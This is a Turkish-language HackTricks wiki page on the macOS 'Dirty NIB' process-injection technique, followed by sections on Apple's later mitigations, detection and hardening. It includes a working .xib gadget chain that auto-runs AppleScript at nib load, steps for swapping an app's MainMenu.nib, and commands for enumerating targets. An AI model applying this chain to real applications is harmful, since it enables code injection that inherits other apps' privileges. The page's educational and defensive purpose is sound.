# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB, imzalı bir macOS app bundle içindeki Interface Builder dosyalarının (.xib/.nib) kötüye kullanılarak hedef process içinde saldırgan kontrollü mantık çalıştırılmasını ve böylece hedef process’in entitlements ve TCC permissions değerlerinin devralınmasını ifade eder. Bu teknik ilk olarak xpn (MDSec) tarafından belgelenmiş, daha sonra Apple’ın macOS 13 Ventura ve macOS 14 Sonoma sürümlerindeki mitigations uygulamalarını da ele alan Sector7 tarafından genelleştirilmiş ve önemli ölçüde genişletilmiştir.<sup>[1][2]</sup> Arka plan ve detaylı incelemeler için sondaki referanslara bakın.

> TL;DR
> • macOS 13 Ventura öncesinde: Bir bundle’ın MainMenu.nib dosyasını (veya startup sırasında yüklenen başka bir nib dosyasını) değiştirmek, güvenilir biçimde process injection ve çoğu zaman privilege escalation sağlayabiliyordu.
> • macOS 13 (Ventura) ile birlikte ve macOS 14’te (Sonoma) geliştirilen first‑launch deep verification, bundle protection, Launch Constraints ve yeni TCC “App Management” permission, ilgisiz app’ler tarafından launch sonrasında nib üzerinde yapılacak değişiklikleri büyük ölçüde engeller. Ancak niş durumlarda saldırılar hâlâ mümkün olabilir (ör. same‑developer tooling’in kendi app’lerini değiştirmesi veya kullanıcı tarafından App Management/Full Disk Access verilen terminaller).


## NIB/XIB dosyaları nedir?

Nib (NeXT Interface Builder’ın kısaltması) dosyaları, AppKit app’leri tarafından kullanılan serialize edilmiş UI object graph’larıdır. Modern Xcode, düzenlenebilir XML .xib dosyalarını build sırasında .nib dosyasına derler. Tipik bir app, main UI’ını `NSApplicationMain()` aracılığıyla yükler; bu işlem app’in Info.plist dosyasındaki `NSMainNibFile` key’ini okur ve object graph’ı runtime sırasında instantiate eder.

Saldırıyı mümkün kılan temel noktalar:
- NIB loading, sınıfların NSSecureCoding’e uymasını gerektirmeden rastgele Objective‑C class’larını instantiate eder (Apple’ın nib loader’ı, `initWithCoder:` mevcut olmadığında `init`/`initWithFrame:` yöntemlerine geri döner).
- Cocoa Bindings, nib’ler instantiate edilirken method’ları çağırmak için kötüye kullanılabilir; buna user interaction gerektirmeyen chained calls da dahildir.


## Dirty NIB injection süreci (attacker view)

Klasik Ventura öncesi akış:
1) Kötü amaçlı bir .xib oluşturun
- Bir `NSAppleScript` object’i (veya `NSTask` gibi başka “gadget” class’ları) ekleyin.
- Payload’ı (ör. AppleScript veya command arguments) title olarak içeren bir `NSTextField` ekleyin.
- Target object üzerindeki method’ları çağırmak için bindings aracılığıyla bağlanmış bir veya daha fazla `NSMenuItem` object’i ekleyin.

2) User click olmadan auto-trigger
- Bir menu item’ın target/selector değerlerini ayarlamak için bindings kullanın ve ardından private `_corePerformAction` method’unu invoke ederek action’ın nib yüklenirken otomatik olarak çalışmasını sağlayın. Böylece user’ın bir button’a tıklaması gerekmez.

Bir .xib içindeki auto-trigger chain’in minimal örneği (açıklık için kısaltılmıştır):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Bu, nib yüklemesi sırasında hedef süreçte rastgele AppleScript çalıştırılmasını sağlar.<sup>[1]</sup> Gelişmiş zincirler şunları yapabilir:
- Rastgele AppKit sınıflarını (ör. `NSTask`) örneklemek ve `-launch` gibi sıfır bağımsız değişkenli yöntemleri çağırmak.
- Yukarıdaki binding hilesiyle nesne bağımsız değişkenleri içeren rastgele selector'ları çağırmak.
- Objective-C ile köprü kurmak ve hatta seçili C API'lerini çağırmak için AppleScriptObjC.framework'ü yüklemek.
- Hâlâ Python.framework içeren eski sistemlerde Python'a köprü kurmak ve ardından rastgele C işlevlerini çağırmak için `ctypes` kullanmak (Sector7 araştırması).<sup>[2]</sup>

3) Uygulamanın nib'ini değiştir
- target.app'yi yazılabilir bir konuma kopyalayın, örneğin `Contents/Resources/MainMenu.nib` dosyasını kötü amaçlı nib ile değiştirin ve target.app'yi çalıştırın. Ventura öncesinde, tek seferlik bir Gatekeeper değerlendirmesinden sonra sonraki başlatmalarda yalnızca yüzeysel imza kontrolleri gerçekleştiriliyordu; bu nedenle `.nib` gibi çalıştırılabilir olmayan kaynaklar yeniden doğrulanmıyordu.

Görünür bir test için örnek AppleScript payload'ı:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple, modern macOS’ta Dirty NIB’in uygulanabilirliğini büyük ölçüde azaltan çeşitli sistemik mitigation’lar sundu:<sup>[2]</sup>
- İlk çalıştırmada derin doğrulama ve bundle koruması (macOS 13 Ventura)
- Herhangi bir uygulamanın ilk çalıştırılmasında (quarantine edilmiş olsun veya olmasın) derin bir signature check, tüm bundle kaynaklarını kapsar. Bundan sonra bundle protected hâle gelir: yalnızca aynı developer’a ait uygulamalar (veya uygulama tarafından açıkça izin verilenler) içeriğini değiştirebilir. Diğer uygulamaların başka bir uygulamanın bundle’ına yazabilmesi için yeni TCC “App Management” izni gerekir.
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled uygulamalar başka bir konuma kopyalanıp çalıştırılamaz; bu durum OS uygulamaları için “copy to /tmp, patch, run” yaklaşımını etkisiz hâle getirir.
- macOS 14 Sonoma’daki iyileştirmeler
- Apple, App Management’ı güçlendirdi ve Sector7 tarafından belirtilen bilinen bypass’ları (ör. CVE‑2023‑40450) düzeltti. Python.framework daha önce (macOS 12.3) kaldırılmıştı; bu da bazı privilege-escalation chain’lerini bozdu.
- Gatekeeper/Quarantine değişiklikleri
- Bu tekniği etkileyen Gatekeeper, provenance ve assessment değişikliklerinin daha geniş kapsamlı bir açıklaması için aşağıda referans verilen sayfaya bakın.

> Pratik sonucu
> • Ventura+ sürümlerinde, process’in App Management izni yoksa veya hedefle aynı Team ID ile signed değilse (ör. developer tooling), genellikle üçüncü taraf bir uygulamanın .nib dosyasını değiştiremezsiniz.
> • Shell’lere/terminal’lere App Management veya Full Disk Access vermek, o terminalin context’i içinde code execute edebilen her şey için bu attack surface’i fiilen yeniden açar.


### Launch Constraints’ı ele alma

Launch Constraints, Ventura ile birlikte birçok Apple uygulamasının default olmayan konumlardan çalıştırılmasını engeller. Bir Apple uygulamasını temp directory’ye kopyalamak, `MainMenu.nib` dosyasını değiştirmek ve ardından uygulamayı çalıştırmak gibi Ventura öncesi workflow’lara güveniyorsanız bunun >= 13.0 sürümlerinde başarısız olmasını bekleyin.


## Hedefleri ve nib’leri listeleme (research / legacy sistemler için kullanışlı)

- UI’ı nib tabanlı olan uygulamaları bulun:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Bir bundle içindeki aday nib kaynaklarını bulun:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Kod imzalarını kapsamlı biçimde doğrulayın (kaynakları değiştirdiyseniz ve yeniden imzalamadıysanız başarısız olur):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Not: Modern macOS'ta uygun yetkilendirme olmadan başka bir uygulamanın bundle'ına yazmaya çalıştığınızda bundle protection/TCC tarafından da engellenirsiniz.


## Detection ve DFIR ipuçları

- Bundle kaynaklarında file integrity monitoring
- Yüklü uygulamalardaki `Contents/Resources/*.nib` ve diğer non-executable kaynaklarda mtime/ctime değişikliklerini izleyin.
- Unified logs ve process behavior
- GUI uygulamaları içinde beklenmeyen AppleScript çalıştırılmasını ve AppleScriptObjC veya Python.framework yükleyen process'leri izleyin. Örnek:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- Kaynakların bütünlüğünü koruduğundan emin olmak için kritik uygulamalarda düzenli olarak `codesign --verify --deep` çalıştırın.
- Privilege context
- TCC “App Management” veya Full Disk Access yetkisine kimlerin/hangi process'lerin sahip olduğunu denetleyin (özellikle terminaller ve management agent'ları). Bunları general-purpose shell'lerden kaldırmak, Dirty NIB tarzı tampering'in kolayca yeniden etkinleştirilmesini önler.


## Defensive hardening (developers ve defenders)

- Programmatic UI kullanmayı veya nib'lerden instantiate edilen öğeleri sınırlandırmayı tercih edin. Güçlü sınıfları (ör. `NSTask`) nib graph'larına dahil etmekten kaçının ve arbitrary object'ler üzerinde selector'ları dolaylı olarak çağıran binding'lerden kaçının.
- Library Validation içeren hardened runtime'ı benimseyin (modern uygulamalarda zaten standarttır). Bu, nib injection'ı tek başına durdurmasa da kolay native code loading'i engeller ve saldırganları yalnızca scripting payload'larına yönlendirir.
- General-purpose tool'larda geniş App Management izinleri istemeyin veya bu izinlere bağlı kalmayın. MDM App Management gerektiriyorsa bu context'i user-driven shell'lerden ayırın.
- Uygulamanızın bundle bütünlüğünü düzenli olarak doğrulayın ve update mekanizmalarınızın bundle kaynaklarını self-heal etmesini sağlayın.


## HackTricks'te ilgili okumalar

Bu tekniği etkileyen Gatekeeper, quarantine ve provenance değişiklikleri hakkında daha fazla bilgi edinin:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (Pages örneğini içeren original write-up)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
